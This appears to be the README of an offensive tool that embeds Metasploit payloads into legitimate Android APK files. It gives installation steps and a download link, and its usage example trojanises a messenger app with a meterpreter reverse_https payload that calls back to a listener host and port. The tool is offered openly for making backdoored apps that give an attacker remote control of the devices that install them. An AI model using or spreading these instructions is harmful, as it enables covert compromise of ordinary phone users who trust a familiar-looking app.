
# **Use it on your own risk** [![Donate](https://img.shields.io/badge/Donate-BTC-green.svg?style=flat-square)](https://blockchain.info/address/1535duT5aPHeetRED4jov6ejHEymvH29jj)

Embed a Metasploit Payload in an Original .Apk File
<br />
> I choose a lazy person to do a hard job. Because a lazy person will find an easy way to do it.
 
  — [Bill Gates](http://www.goodreads.com/quotes/568877-i-choose-a-lazy-person-to-do-a-hard-job)
 
**This script is a POC for injecting metasploit payloads on arbitrary APKs**

**Authored by timwr, Jack64 , developed by [xC0d3rZ](https://xc0d3rz.github.io)**

### Installation

```bash
 gem install bundler
 bundler install
```

### Requirements 
 
 1. Ruby (**>= 1.8.7**).
 2. apktool.jar (**>= 2.x**).

### Usage

```bash
./run [target.apk] [msfvenom options]
```
<br>
e.g

```bash
./run messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443
```
### [Download](https://github.com/xc0d3rz/metasploit-apk-embed-payload/releases)
  

